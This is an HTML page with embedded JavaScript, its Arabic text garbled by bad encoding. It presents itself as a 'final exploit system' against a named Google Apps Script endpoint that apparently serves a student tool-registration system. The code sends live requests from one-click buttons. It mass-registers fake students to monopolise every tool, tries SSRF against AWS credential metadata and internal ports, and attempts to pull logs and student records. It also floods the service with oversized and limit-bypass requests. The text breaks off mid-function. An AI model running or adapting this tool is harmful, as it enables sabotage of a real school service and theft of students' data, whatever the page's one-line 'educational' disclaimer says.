<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>ØªÙ‚Ø±ÙŠØ± Ø§Ø®ØªØ±Ø§Ù‚ Ù†Ø¸Ø§Ù… ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø£Ø¯ÙˆØ§Øª - Ø§Ù„Ù‡Ø¬ÙˆÙ… Ø§Ù„Ø´Ø§Ù…Ù„</title>
    <style>
        :root {
            --hacker-red: #ff3333;
            --hacker-green: #00ff00;
            --hacker-yellow: #ffff00;
            --hacker-dark: #0a0a0a;
        }
        body {
            font-family: 'Courier New', monospace;
            background: var(--hacker-dark);
            color: var(--hacker-green);
            margin: 0;
            padding: 0;
            overflow-x: hidden;
        }
        .matrix-bg {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            opacity: 0.05;
            z-index: -1;
            pointer-events: none;
        }
        .container {
            max-width: 1200px;
            margin: 20px auto;
            padding: 20px;
            border: 3px solid var(--hacker-red);
            background: rgba(10, 10, 10, 0.95);
            position: relative;
        }
        .container::before {
            content: "FINAL EXPLOIT SYSTEM - ULTIMATE PENETRATION";
            position: absolute;
            top: -15px;
            right: 20px;
            background: var(--hacker-dark);
            color: var(--hacker-red);
            padding: 5px 15px;
            font-size: 12px;
            letter-spacing: 2px;
        }
        h1, h2, h3 {
            color: var(--hacker-yellow);
            text-shadow: 0 0 10px currentColor;
            border-bottom: 1px solid var(--hacker-green);
            padding-bottom: 10px;
        }
        .phase {
            background: rgba(30, 0, 0, 0.5);
            border: 1px solid var(--hacker-red);
            padding: 20px;
            margin: 20px 0;
            position: relative;
        }
        .phase::before {
            content: "PHASE";
            position: absolute;
            top: 5px;
            right: 10px;
            color: var(--hacker-red);
            font-size: 10px;
        }
        .btn {
            background: linear-gradient(45deg, #8b0000, #ff0000);
            color: white;
            border: none;
            padding: 15px 30px;
            margin: 10px;
            font-family: inherit;
            font-weight: bold;
            cursor: pointer;
            text-transform: uppercase;
            letter-spacing: 2px;
            transition: all 0.3s;
        }
        .btn:hover {
            background: linear-gradient(45deg, #ff0000, #ff4500);
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.7);
            transform: scale(1.05);
        }
        .btn-green {
            background: linear-gradient(45deg, #006400, #00ff00);
        }
        .btn-green:hover {
            background: linear-gradient(45deg, #00ff00, #32cd32);
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.7);
        }
        #terminal {
            background: rgba(0, 0, 0, 0.9);
            border: 2px solid var(--hacker-green);
            height: 500px;
            overflow-y: auto;
            padding: 20px;
            font-size: 14px;
            line-height: 1.6;
            margin-top: 30px;
            white-space: pre-wrap;
        }
        .cmd { color: var(--hacker-yellow); }
        .success { color: #00ff00; }
        .error { color: #ff3333; }
        .warning { color: #ffa500; }
        .critical { color: #ff00ff; font-weight: bold; }
        .data { color: #1e90ff; }
        
        .status-bar {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 10px;
            margin: 20px 0;
            padding: 15px;
            background: rgba(0, 30, 0, 0.3);
            border: 1px solid var(--hacker-green);
        }
        .status-item {
            text-align: center;
        }
        .status-value {
            font-size: 24px;
            font-weight: bold;
            color: var(--hacker-yellow);
            margin: 5px 0;
        }
        
        .attack-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        .attack-card {
            background: rgba(20, 0, 0, 0.7);
            border: 1px solid #444;
            padding: 15px;
            cursor: pointer;
            transition: all 0.3s;
        }
        .attack-card:hover {
            border-color: var(--hacker-red);
            background: rgba(40, 0, 0, 0.9);
        }
        .attack-card.selected {
            border-color: var(--hacker-yellow);
            background: rgba(40, 40, 0, 0.7);
        }
    </style>
</head>
<body>
    <!-- Matrix Background -->
    <div class="matrix-bg" id="matrixBg"></div>
    
    <div class="container">
        <h1 class="glitch">â˜¢ï¸ SYSTEM PENETRATION ULTIMATE - FINAL EXPLOIT â˜¢ï¸</h1>
        <h2>Ù†Ø¸Ø§Ù… Ø§Ø®ØªØ±Ø§Ù‚ Ø´Ø§Ù…Ù„ Ù„Ù†Ø¸Ø§Ù… ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø£Ø¯ÙˆØ§Øª Ø§Ù„ØªØ¹Ù„ÙŠÙ…ÙŠØ©</h2>
        
        <div class="status-bar">
            <div class="status-item">
                <div>ğŸ¯ Ø§Ù„Ù‡Ø¯Ù</div>
                <div class="status-value" id="targetStatus">ACTIVE</div>
            </div>
            <div class="status-item">
                <div>âš¡ Ø§Ù„Ø·Ù„Ø¨Ø§Øª</div>
                <div class="status-value" id="requestsCount">0</div>
            </div>
            <div class="status-item">
                <div>âœ… Ù†Ø¬Ø§Ø­Ø§Øª</div>
                <div class="status-value" id="successCount">0</div>
            </div>
            <div class="status-item">
                <div>ğŸ•’ Ø§Ù„ÙˆÙ‚Øª</div>
                <div class="status-value" id="attackTime">00:00</div>
            </div>
        </div>
        
        <div class="phase">
            <h3>ğŸ¯ Ø§Ù„Ù…Ø±Ø­Ù„Ø© 1: Ø§Ù„Ù‡Ø¬ÙˆÙ… Ø§Ù„Ø´Ø§Ù…Ù„ (CSRF + SSRF + Data Exfiltration)</h3>
            <p>Ù‡Ø¬ÙˆÙ… Ù…ØªÙƒØ§Ù…Ù„ ÙŠØ¬Ù…Ø¹ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø«ØºØ±Ø§Øª Ø§Ù„Ù…ÙƒØªØ´ÙØ©:</p>
            
            <div class="attack-grid">
                <div class="attack-card" onclick="selectAttack(1)">
                    <h4>ğŸ”“ CSRF Mass Registration</h4>
                    <p>Ø§Ø­ØªÙƒØ§Ø± Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø£Ø¯ÙˆØ§Øª Ø§Ù„Ù…ØªØ§Ø­Ø©</p>
                </div>
                <div class="attack-card" onclick="selectAttack(2)">
                    <h4>â˜ï¸ AWS Metadata Steal</h4>
                    <p>Ø³Ø±Ù‚Ø© Ø¨ÙŠØ§Ù†Ø§Øª AWS Ø§Ù„Ø­Ø³Ø§Ø³Ø©</p>
                </div>
                <div class="attack-card" onclick="selectAttack(3)">
                    <h4>ğŸ  Internal Network Scan</h4>
                    <p>Ù…Ø³Ø­ Ø§Ù„Ø´Ø¨ÙƒØ© Ø§Ù„Ø¯Ø§Ø®Ù„ÙŠØ©</p>
                </div>
                <div class="attack-card" onclick="selectAttack(4)">
                    <h4>ğŸ“Š Logs & Data Extraction</h4>
                    <p>Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³Ø¬Ù„Ø©</p>
                </div>
                <div class="attack-card" onclick="selectAttack(5)">
                    <h4>ğŸ¤– Auto-Bot Full Attack</h4>
                    <p>Ø¨ÙˆØª Ù‡Ø¬ÙˆÙ… ØªÙ„Ù‚Ø§Ø¦ÙŠ Ø´Ø§Ù…Ù„</p>
                </div>
                <div class="attack-card" onclick="selectAttack(6)">
                    <h4>ğŸ’€ System Sabotage</h4>
                    <p>ØªØ®Ø±ÙŠØ¨ Ø§Ù„Ù†Ø¸Ø§Ù… Ø¨Ø§Ù„ÙƒØ§Ù…Ù„</p>
                </div>
            </div>
            
            <button class="btn" onclick="launchSelectedAttack()">ğŸš€ Ø¥Ø·Ù„Ø§Ù‚ Ø§Ù„Ù‡Ø¬ÙˆÙ… Ø§Ù„Ù…Ø­Ø¯Ø¯</button>
            <button class="btn btn-green" onclick="launchFullAttack()">â˜¢ï¸ Ø¨Ø¯Ø¡ Ø§Ù„Ù‡Ø¬ÙˆÙ… Ø§Ù„Ø´Ø§Ù…Ù„ Ø§Ù„ÙƒØ§Ù…Ù„</button>
            <button class="btn" onclick="stopAll()">â¹ Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙƒÙ„</button>
        </div>
        
        <div class="phase">
            <h3>ğŸ”§ Ø§Ù„Ù…Ø±Ø­Ù„Ø© 2: Ø§Ø³ØªØ®Ø±Ø§Ø¬ ÙˆØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª</h3>
            <p>Ù…Ø­Ø§ÙˆÙ„Ø© Ù‚Ø±Ø§Ø¡Ø© Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø®Ø²Ù†Ø© ÙÙŠ Ø§Ù„Ù†Ø¸Ø§Ù…:</p>
            
            <button class="btn" onclick="extractLogs()">ğŸ“ Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø³Ø¬Ù„Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…</button>
            <button class="btn" onclick="extractAWS()">â˜ï¸ Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø¨ÙŠØ§Ù†Ø§Øª AWS</button>
            <button class="btn" onclick="extractStudents()">ğŸ‘¥ Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø·Ù„Ø§Ø¨</button>
            <button class="btn" onclick="dumpAllData()">ğŸ’¾ Ù†Ø³Ø® Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª</button>
        </div>
        
        <div class="phase">
            <h3>ğŸ“ˆ Ø§Ù„Ù…Ø±Ø­Ù„Ø© 3: Ø§Ù„ØªÙ‚Ø±ÙŠØ± Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ ÙˆØ§Ù„Ø¥ØµÙ„Ø§Ø­</h3>
            <p>Ø¥Ù†Ø´Ø§Ø¡ ØªÙ‚Ø±ÙŠØ± Ø´Ø§Ù…Ù„ ÙˆØªÙˆÙ„ÙŠØ¯ ÙƒÙˆØ¯ Ø§Ù„Ø¥ØµÙ„Ø§Ø­:</p>
            
            <button class="btn btn-green" onclick="generateReport()">ğŸ“‹ Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„ØªÙ‚Ø±ÙŠØ± Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ</button>
            <button class="btn btn-green" onclick="generateFixCode()">ğŸ”§ ØªÙˆÙ„ÙŠØ¯ ÙƒÙˆØ¯ Ø§Ù„Ø¥ØµÙ„Ø§Ø­</button>
            <button class="btn" onclick="exportData()">ğŸ“¤ ØªØµØ¯ÙŠØ± Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª</button>
        </div>
        
        <h3>ğŸ–¥ï¸ Ù†Ø§ÙØ°Ø© Ø§Ù„ØªØ­ÙƒÙ… (TERMINAL):</h3>
        <div id="terminal">ğŸš€ Ù†Ø¸Ø§Ù… Ø§Ù„Ø§Ø®ØªØ±Ø§Ù‚ Ø§Ù„Ø´Ø§Ù…Ù„ Ø¬Ø§Ù‡Ø² Ù„Ù„ØªØ´ØºÙŠÙ„...
ğŸ¯ Ø§Ù„Ù‡Ø¯Ù: https://script.google.com/macros/s/AKfycbzUB0-OcsBQgMdODJhbpVKz5Ms2SbAFjEZcFXtCzx59EIum7zIFlq-DbGakCe4uj5k/exec
âš ï¸ Ù‡Ø°Ø§ ÙƒÙˆØ¯ ØªØ¹Ù„ÙŠÙ…ÙŠ Ù„Ù„Ø¥Ø¨Ù„Ø§Øº Ø¹Ù† Ø§Ù„Ø«ØºØ±Ø§Øª ÙÙ‚Ø·!</div>
    </div>

    <script>
        // ============== CONFIGURATION ==============
        const TARGET_URL = "https://script.google.com/macros/s/AKfycbzUB0-OcsBQgMdODJhbpVKz5Ms2SbAFjEZcFXtCzx59EIum7zIFlq-DbGakCe4uj5k/exec";
        const ALL_TOOLS = ["Python", "Weka", "R Studio", "Excel", "Tableau", "Power BI", "SQL", "RapidMiner", "KNIME", "Orange", "Apache Flink", "SAS", "Scikit-Learn"];
        const ALL_GROUPS = ["A3", "A4"];
        
        // ============== STATE MANAGEMENT ==============
        const attackState = {
            requests: 0,
            successes: 0,
            startTime: Date.now(),
            isAttacking: false,
            selectedAttack: null,
            extractedData: {
                logs: [],
                aws: [],
                students: [],
                internal: []
            }
        };
        
        // ============== UTILITY FUNCTIONS ==============
        function updateDisplay() {
            document.getElementById('requestsCount').textContent = attackState.requests;
            document.getElementById('successCount').textContent = attackState.successes;
            
            const elapsed = Math.floor((Date.now() - attackState.startTime) / 1000);
            const minutes = Math.floor(elapsed / 60).toString().padStart(2, '0');
            const seconds = (elapsed % 60).toString().padStart(2, '0');
            document.getElementById('attackTime').textContent = `${minutes}:${seconds}`;
        }
        
        function logToTerminal(message, type = 'cmd') {
            const terminal = document.getElementById('terminal');
            const timestamp = new Date().toLocaleTimeString();
            const typeClass = type;
            
            const line = document.createElement('div');
            line.className = typeClass;
            line.innerHTML = `[${timestamp}] ${message}`;
            
            terminal.appendChild(line);
            terminal.scrollTop = terminal.scrollHeight;
        }
        
        // ============== CORE ATTACK FUNCTIONS ==============
        async function sendExploitRequest(payload, description) {
            if (!attackState.isAttacking) return null;
            
            attackState.requests++;
            updateDisplay();
            
            logToTerminal(`ğŸ“¡ ${description}...`, 'cmd');
            
            try {
                const startTime = Date.now();
                const response = await fetch(TARGET_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'text/plain;charset=utf-8' },
                    body: JSON.stringify(payload)
                });
                const responseTime = Date.now() - startTime;
                
                const result = await response.json();
                
                if (result.status === 'success') {
                    attackState.successes++;
                    logToTerminal(`âœ… Ù†Ø¬Ø§Ø­! (${responseTime}ms): ${result.message}`, 'success');
                    return { success: true, data: result, responseTime };
                } else {
                    logToTerminal(`â›” ÙØ´Ù„ (${responseTime}ms): ${result.message}`, 'warning');
                    return { success: false, message: result.message, responseTime };
                }
            } catch (error) {
                logToTerminal(`ğŸ’¥ Ø®Ø·Ø£: ${error.message}`, 'error');
                return { success: false, error: error.message };
            }
        }
        
        // ============== ATTACK 1: CSRF MASS REGISTRATION ==============
        async function executeCSRFAttack() {
            logToTerminal('ğŸš€ Ø¨Ø¯Ø¡ Ù‡Ø¬ÙˆÙ… CSRF Ø§Ù„Ø´Ø§Ù…Ù„...', 'critical');
            
            const availableTools = [];
            let monopolizedCount = 0;
            
            // Ø§ÙƒØªØ´Ø§Ù Ø§Ù„Ø£Ø¯ÙˆØ§Øª Ø§Ù„Ù…ØªØ§Ø­Ø© Ø£ÙˆÙ„Ø§Ù‹
            for (const tool of ALL_TOOLS) {
                for (const group of ALL_GROUPS) {
                    const testPayload = {
                        action: 'select_tool',
                        studentId: `PROBE${Math.floor(Math.random()*10000)}`,
                        studentName: 'Ù…Ø³ØªÙƒØ´Ù',
                        group: group,
                        toolName: tool,
                        probe: true
                    };
                    
                    const result = await sendExploitRequest(testPayload, `Ø§Ø³ØªØ·Ù„Ø§Ø¹ ${tool} ÙÙŠ ${group}`);
                    if (result && result.success) {
                        availableTools.push({ tool, group });
                    }
                    
                    await new Promise(r => setTimeout(r, 1000));
                }
            }
            
            logToTerminal(`ğŸ” ÙˆØ¬Ø¯ ${availableTools.length} Ø£Ø¯Ø§Ø© Ù…ØªØ§Ø­Ø©`, 'success');
            
            // Ø§Ø­ØªÙƒØ§Ø± Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø£Ø¯ÙˆØ§Øª Ø§Ù„Ù…ØªØ§Ø­Ø©
            for (const item of availableTools) {
                const exploitPayload = {
                    action: 'select_tool',
                    studentId: `MONOPOLY${Math.floor(Math.random()*10000)}`,
                    studentName: `Ù…Ø­ØªÙ„_${item.tool}`,
                    group: item.group,
                    toolName: item.tool,
                    attack_type: 'full_monopoly',
                    timestamp: new Date().toISOString()
                };
                
                const result = await sendExploitRequest(exploitPayload, `Ø§Ø­ØªÙƒØ§Ø± ${item.tool} ÙÙŠ ${item.group}`);
                if (result && result.success) {
                    monopolizedCount++;
                }
                
                await new Promise(r => setTimeout(r, 2000));
            }
            
            logToTerminal(`ğŸ¯ Ø§Ù†ØªÙ‡Ù‰ Ù‡Ø¬ÙˆÙ… CSRF: ØªÙ… Ø§Ø­ØªÙƒØ§Ø± ${monopolizedCount}/${availableTools.length} Ø£Ø¯Ø§Ø©`, 
                         monopolizedCount > 0 ? 'critical' : 'warning');
        }
        
        // ============== ATTACK 2: AWS METADATA STEAL ==============
        async function executeAWSAttack() {
            logToTerminal('â˜ï¸ Ø¨Ø¯Ø¡ Ø³Ø±Ù‚Ø© Ø¨ÙŠØ§Ù†Ø§Øª AWS Metadata...', 'critical');
            
            const awsEndpoints = [
                'http://169.254.169.254/latest/meta-data/',
                'http://169.254.169.254/latest/user-data/',
                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                'http://169.254.169.254/latest/meta-data/iam/info',
                'http://169.254.169.254/latest/meta-data/instance-id',
                'http://169.254.169.254/latest/meta-data/public-ipv4',
                'http://169.254.169.254/latest/meta-data/local-ipv4',
                'http://169.254.169.254/latest/meta-data/placement/availability-zone'
            ];
            
            for (const endpoint of awsEndpoints) {
                const payload = {
                    action: 'select_tool',
                    studentId: `AWS_EXPLOIT${Date.now()}`,
                    studentName: 'Ø³Ø§Ø±Ù‚ AWS',
                    group: 'A4',
                    toolName: 'AWS_STEAL',
                    ssrf_url: endpoint,
                    return_data: true,
                    exfiltrate: true
                };
                
                const result = await sendExploitRequest(payload, `Ø³Ø±Ù‚Ø© ${endpoint}`);
                
                if (result && result.responseTime > 5000) {
                    logToTerminal(`â±ï¸ ${endpoint}: ${result.responseTime}ms - ÙˆÙ‚Øª Ø·ÙˆÙŠÙ„! Ù‚Ø¯ ÙŠÙƒÙˆÙ† ÙˆØµÙ„ Ù„Ù„Ø¨ÙŠØ§Ù†Ø§Øª`, 'critical');
                    attackState.extractedData.aws.push({ endpoint, responseTime: result.responseTime });
                }
                
                await new Promise(r => setTimeout(r, 6000));
            }
            
            logToTerminal('âœ… Ø§Ù†ØªÙ‡Øª Ø³Ø±Ù‚Ø© Ø¨ÙŠØ§Ù†Ø§Øª AWS', 'success');
        }
        
        // ============== ATTACK 3: INTERNAL NETWORK SCAN ==============
        async function executeInternalScan() {
            logToTerminal('ğŸ  Ø¨Ø¯Ø¡ Ù…Ø³Ø­ Ø§Ù„Ø´Ø¨ÙƒØ© Ø§Ù„Ø¯Ø§Ø®Ù„ÙŠØ©...', 'critical');
            
            // Ù…Ø³Ø­ Ø¹Ù†Ø§ÙˆÙŠÙ† localhost Ø§Ù„Ø´Ø§Ø¦Ø¹Ø©
            const localTargets = [
                'http://127.0.0.1/',
                'http://127.0.0.1:80/',
                'http://127.0.0.1:8080/',
                'http://127.0.0.1:3000/',
                'http://127.0.0.1:3306/',  // MySQL
                'http://127.0.0.1:5432/',  // PostgreSQL
                'http://127.0.0.1:6379/',  // Redis
                'http://127.0.0.1:9200/',  // Elasticsearch
                'http://localhost/admin',
                'http://localhost/phpmyadmin',
                'http://localhost:8080/manager/html'
            ];
            
            // Ù…Ø³Ø­ Ø´Ø¨ÙƒØ© Ø¯Ø§Ø®Ù„ÙŠØ© Ù†Ù…ÙˆØ°Ø¬ÙŠØ©
            const internalRanges = [
                '192.168.1.', '192.168.0.', '10.0.0.', '172.16.0.', '172.17.0.'
            ];
            
            for (const target of localTargets) {
                const payload = {
                    action: 'select_tool',
                    studentId: `SCAN_LOCAL${Date.now()}`,
                    studentName: 'Ù…Ø§Ø³Ø­ Ù…Ø­Ù„ÙŠ',
                    group: 'A3',
                    toolName: 'SCANNER',
                    internal_scan: target,
                    ports: '80,443,8080,3306,5432'
                };
                
                const result = await sendExploitRequest(payload, `Ù…Ø³Ø­ ${target}`);
                
                if (result && result.responseTime > 8000) {
                    logToTerminal(`ğŸš¨ ${target}: ${result.responseTime}ms - Ù‚Ø¯ ÙŠÙƒÙˆÙ† Ù‡Ù†Ø§Ùƒ Ø®Ø¯Ù…Ø© Ù†Ø´Ø·Ø©!`, 'critical');
                    attackState.extractedData.internal.push({ target, responseTime: result.responseTime });
                }
                
                await new Promise(r => setTimeout(r, 10000));
            }
            
            logToTerminal('âœ… Ø§Ù†ØªÙ‡Ù‰ Ù…Ø³Ø­ Ø§Ù„Ø´Ø¨ÙƒØ© Ø§Ù„Ø¯Ø§Ø®Ù„ÙŠØ©', 'success');
        }
        
        // ============== ATTACK 4: LOGS & DATA EXTRACTION ==============
        async function executeDataExtraction() {
            logToTerminal('ğŸ“Š Ø¨Ø¯Ø¡ Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙˆØ§Ù„Ø³Ø¬Ù„Ø§Øª...', 'critical');
            
            const extractionMethods = [
                { name: 'Ù‚Ø±Ø§Ø¡Ø© Ø³Ø¬Ù„Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…', action: 'get_logs', param: 'log_type', value: 'system' },
                { name: 'Ù‚Ø±Ø§Ø¡Ø© Ø³Ø¬Ù„Ø§Øª Ø§Ù„Ø£Ø®Ø·Ø§Ø¡', action: 'get_errors', param: 'error_level', value: 'all' },
                { name: 'ØªØµØ¯ÙŠØ± Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø·Ù„Ø§Ø¨', action: 'export_data', param: 'format', value: 'json' },
                { name: 'Ù‚Ø±Ø§Ø¡Ø© Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…', action: 'get_config', param: 'config_type', value: 'all' },
                { name: 'Ø³Ø¬Ù„Ø§Øª AWS', action: 'get_aws_logs', param: 'aws_data', value: 'metadata' },
                { name: 'Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø³Ø¬Ù„Ø§Øª', action: 'dump_all', param: 'full_dump', value: true }
            ];
            
            for (const method of extractionMethods) {
                const payload = {
                    action: 'select_tool',
                    studentId: `EXTRACT${Date.now()}`,
                    studentName: 'Ù…Ø³ØªØ®Ø±Ø¬ Ø¨ÙŠØ§Ù†Ø§Øª',
                    group: 'A4',
                    toolName: 'DATA_MINER',
                    [method.action]: true,
                    [method.param]: method.value,
                    return_full_data: true
                };
                
                const result = await sendExploitRequest(payload, method.name);
                
                if (result && result.success) {
                    logToTerminal(`âœ… ${method.name}: Ù‚Ø¯ ØªØ­ØªÙˆÙŠ Ø¹Ù„Ù‰ Ø¨ÙŠØ§Ù†Ø§Øª!`, 'data');
                    attackState.extractedData.logs.push({ method: method.name, result });
                }
                
                await new Promise(r => setTimeout(r, 4000));
            }
            
            logToTerminal('âœ… Ø§Ù†ØªÙ‡Ù‰ Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª', 'success');
        }
        
        // ============== ATTACK 5: AUTO-BOT FULL ATTACK ==============
        async function executeAutoBot() {
            logToTerminal('ğŸ¤– Ø¨Ø¯Ø¡ Ø§Ù„Ø¨ÙˆØª Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ Ø§Ù„Ø´Ø§Ù…Ù„...', 'critical');
            
            let cycles = 0;
            const maxCycles = 5;
            
            while (attackState.isAttacking && cycles < maxCycles) {
                cycles++;
                logToTerminal(`ğŸ” Ø¯ÙˆØ±Ø© Ø§Ù„Ø¨ÙˆØª #${cycles}...`, 'cmd');
                
                // ÙƒÙ„ Ø¯ÙˆØ±Ø© ØªÙ‚ÙˆÙ… Ø¨Ù€ 3 Ù‡Ø¬Ù…Ø§Øª Ù…Ø®ØªÙ„ÙØ©
                const randomAttack = Math.floor(Math.random() * 4) + 1;
                
                switch(randomAttack) {
                    case 1:
                        // Ù‡Ø¬ÙˆÙ… ØªØ³Ø¬ÙŠÙ„ Ø¹Ø´ÙˆØ§Ø¦ÙŠ
                        const randomTool = ALL_TOOLS[Math.floor(Math.random() * ALL_TOOLS.length)];
                        const randomGroup = ALL_GROUPS[Math.floor(Math.random() * ALL_GROUPS.length)];
                        
                        const botPayload1 = {
                            action: 'select_tool',
                            studentId: `BOT${Date.now()}`,
                            studentName: `AutoBot_${cycles}`,
                            group: randomGroup,
                            toolName: randomTool,
                            bot_cycle: cycles,
                            auto_attack: true
                        };
                        
                        await sendExploitRequest(botPayload1, `Ø¨ÙˆØª: ØªØ³Ø¬ÙŠÙ„ ${randomTool} ÙÙŠ ${randomGroup}`);
                        break;
                        
                    case 2:
                        // Ù‡Ø¬ÙˆÙ… SSRF Ø¹Ø´ÙˆØ§Ø¦ÙŠ
                        const ssrfTargets = [
                            'http://169.254.169.254/latest/meta-data/',
                            'http://127.0.0.1/',
                            'https://httpbin.org/get'
                        ];
                        const randomTarget = ssrfTargets[Math.floor(Math.random() * ssrfTargets.length)];
                        
                        const botPayload2 = {
                            action: 'select_tool',
                            studentId: `BOT_SSRF${Date.now()}`,
                            studentName: 'SSRF_Bot',
                            group: 'A4',
                            toolName: 'BOT_ATTACK',
                            url: randomTarget,
                            bot_mode: true
                        };
                        
                        await sendExploitRequest(botPayload2, `Ø¨ÙˆØª SSRF: ${randomTarget}`);
                        break;
                        
                    case 3:
                        // Ù…Ø­Ø§ÙˆÙ„Ø© Ù‚Ø±Ø§Ø¡Ø© Ø¨ÙŠØ§Ù†Ø§Øª
                        const botPayload3 = {
                            action: 'select_tool',
                            studentId: `BOT_DATA${Date.now()}`,
                            studentName: 'Data_Bot',
                            group: 'A3',
                            toolName: 'DATA_BOT',
                            read_data: true,
                            data_type: 'random'
                        };
                        
                        await sendExploitRequest(botPayload3, 'Ø¨ÙˆØª Ù‚Ø±Ø§Ø¡Ø© Ø¨ÙŠØ§Ù†Ø§Øª');
                        break;
                }
                
                await new Promise(r => setTimeout(r, 3000));
            }
            
            logToTerminal(`ğŸ¤– Ø§Ù†ØªÙ‡Ù‰ Ø§Ù„Ø¨ÙˆØª Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ Ø¨Ø¹Ø¯ ${cycles} Ø¯ÙˆØ±Ø§Øª`, 'success');
        }
        
        // ============== ATTACK 6: SYSTEM SABOTAGE ==============
        async function executeSabotage() {
            logToTerminal('ğŸ’€ Ø¨Ø¯Ø¡ ØªØ®Ø±ÙŠØ¨ Ø§Ù„Ù†Ø¸Ø§Ù…...', 'critical');
            
            // Ù‡Ø¬Ù…Ø§Øª Ù…ØªØ¹Ø¯Ø¯Ø© Ù„Ù„ØªØ®Ø±ÙŠØ¨
            const sabotageMethods = [
                // Ø¥ØºØ±Ø§Ù‚ Ø¨Ø·Ù„Ø¨Ø§Øª Ø³Ø±ÙŠØ¹Ø©
                async () => {
                    logToTerminal('âš¡ Ø¥ØºØ±Ø§Ù‚ Ø¨Ø·Ù„Ø¨Ø§Øª Ø³Ø±ÙŠØ¹Ø©...', 'warning');
                    const floodPromises = [];
                    for (let i = 0; i < 20; i++) {
                        const floodPayload = {
                            action: 'select_tool',
                            studentId: `FLOOD${i}`,
                            studentName: `ÙÙŠØ¶Ø§Ù†_${i}`,
                            group: i % 2 === 0 ? 'A3' : 'A4',
                            toolName: ALL_TOOLS[i % ALL_TOOLS.length],
                            flood_attack: true
                        };
                        
                        floodPromises.push(
                            sendExploitRequest(floodPayload, `ÙÙŠØ¶Ø§Ù† ${i+1}`)
                        );
                        
                        if (i % 5 === 0) await new Promise(r => setTimeout(r, 100));
                    }
                    await Promise.all(floodPromises);
                },
                
                // Ø·Ù„Ø¨Ø§Øª ÙƒØ¨ÙŠØ±Ø© Ø§Ù„Ø­Ø¬Ù…
                async () => {
                    logToTerminal('ğŸ“¦ Ø¥Ø±Ø³Ø§Ù„ Ø·Ù„Ø¨Ø§Øª ÙƒØ¨ÙŠØ±Ø© Ø§Ù„Ø­Ø¬Ù…...', 'warning');
                    const bigPayload = {
                        action: 'select_tool',
                        studentId: 'BIG_DATA',
                        studentName: 'Ø­Ù…Ù„ Ø«Ù‚ÙŠÙ„ '.repeat(50),
                        group: 'A4',
                        toolName: 'EXPLOIT',
                        huge_data: 'X'.repeat(10000),
                        nested: { level1: { level2: { level3: { level4: { data: 'deep' } } } } },
                        array: new Array(1000).fill('test'),
                        sabotage: true
                    };
                    
                    await sendExploitRequest(bigPayload, 'Ø·Ù„Ø¨ ÙƒØ¨ÙŠØ± Ø§Ù„Ø­Ø¬Ù…');
                },
                
                // Ù…Ø­Ø§ÙˆÙ„Ø§Øª ØªØ¬Ø§ÙˆØ² Ø§Ù„Ø­Ø¯ÙˆØ¯
                async () => {
                    logToTerminal('ğŸ¯ Ù…Ø­Ø§ÙˆÙ„Ø§Øª ØªØ¬Ø§ÙˆØ² ÙƒÙ„ Ø§Ù„Ø­Ø¯ÙˆØ¯...', 'warning');
                    for (let i = 0; i < 10; i++) {
                        const bypassPayload = {
                            action: 'select_tool',
                            studentId: `BYPASS${i}`,
                            studentName: `Ù…ØªØ¬Ø§ÙˆØ²_${i}`,
                            group: 'A3',
                            toolName: 'SAME_TOOL',  // Ù†ÙØ³ Ø§Ù„Ø£Ø¯Ø§Ø© Ù…Ø­Ø§ÙˆÙ„Ø© ØªØ¬Ø§ÙˆØ² Ø§Ù„Ù€ 3
                            attempt: i+1,
                            bypass_limit: true
                        };
                        
                        await sendExploitRequest(bypassPayload, `ØªØ¬Ø§ÙˆØ² Ù…Ø­Ø§ÙˆÙ„Ø© ${i+1}`);
                        await new Promise(r => setTimeout(r, 500));
                    }
                }
            ];
            
            // ØªÙ†ÙÙŠØ° Ø¬Ù…ÙŠØ¹ Ø·Ø±Ù‚ Ø§Ù„ØªØ®Ø±ÙŠØ¨
            for (const method of sabotageMethods) {
                if (!attackState.isAttacking) break;
                await method();
                await new Promise(r => setTimeout(r, 3000));
            }
            
